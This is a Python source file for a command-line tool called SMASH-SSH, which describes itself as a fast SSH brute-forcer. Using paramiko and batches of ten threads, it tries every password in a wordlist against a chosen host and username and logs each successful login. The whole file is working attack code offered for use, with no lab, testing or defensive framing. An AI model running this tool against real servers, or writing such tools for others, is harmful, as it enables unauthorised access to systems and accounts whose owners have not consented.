'''


'''
import os
import threading
import logging
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception
import argparse

DEFAULT_PORT = 22


def send_payload(host, username, password, port):
    client = SSHClient()
    client.set_missing_host_key_policy(AutoAddPolicy())

    try:
        client.connect(host, port=port, username=username, password=password, banner_timeout=300)
        logging.info(f"[+] SUCCESS: {username}:{password} on {host}")
        client.close()
    except AuthenticationException:
        logging.warning(f"[-] Invalid Credentials: {username}:{password}")
    except ssh_exception.SSHException:
        logging.error("[!] SSHException: Possible rate-limiting on server")
    except Exception as error:
        logging.error(f"[!] Connection Error: {error}")
    finally:
        client.close()


def help_docs():
    pass

def brute_force_ssh(host, username, wordlist, port):
    if not os.path.exists(wordlist):
        logging.error(f"[!] Wordlist file '{wordlist}' not found.")
        return
    
    with open(wordlist, "r", encoding="utf-8") as file:
        passwords = [line.strip() for line in file if line.strip()]

    threads = []
    for password in passwords:
        thread = threading.Thread(target=send_payload, args=(host, username, password, port))
        threads.append(thread)
        thread.start()
        
        # Limit thread count to avoid overloading
        if len(threads) >= 10:
            for t in threads:
                t.join()
            threads.clear()

    # Join any remaining threads
    for t in threads:
        t.join()



def print_banner():
    ascii_art = """
    ███████╗███╗   ███╗ █████╗ ███████╗██╗  ██╗        ███████╗███████╗██╗  ██╗
    ██╔════╝████╗ ████║██╔══██╗██╔════╝██║  ██║        ██╔════╝██╔════╝██║  ██║
    ███████╗██╔████╔██║███████║███████╗███████║        ███████╗███████╗███████║
    ╚════██║██║╚██╔╝██║██╔══██║╚════██║██╔══██║        ╚════██║╚════██║██╔══██║
    ███████║██║ ╚═╝ ██║██║  ██║███████║██║  ██║        ███████║███████║██║  ██║
    ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝        ╚══════╝╚══════╝╚═╝  ╚═╝
    """
    print(ascii_art)


def parse_args():
    parser = argparse.ArgumentParser(description="SMASH-SSH: A fast SSH brute-forcer.")
    parser.add_argument("-H", "--host", required=True, help="Target SSH server IP or hostname")
    parser.add_argument("-u", "--username", required=True, help="Username to attempt login")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to password wordlist file")
    parser.add_argument("-p", "--port", type=int, default=DEFAULT_PORT, help="SSH port (default: 22)")

    return parser.parse_args()


def main():
    #TODO confirm file can be reached and exists
    #TODO validate if correct host is provided
    print_banner()
    args = parse_args()
    logging.info(f"[*] Starting SSH brute-force on {args.host}:{args.port} with user '{args.username}'")
    brute_force_ssh(args.host, args.username, args.wordlist, args.port)




if __name__=="__main__":
    main()

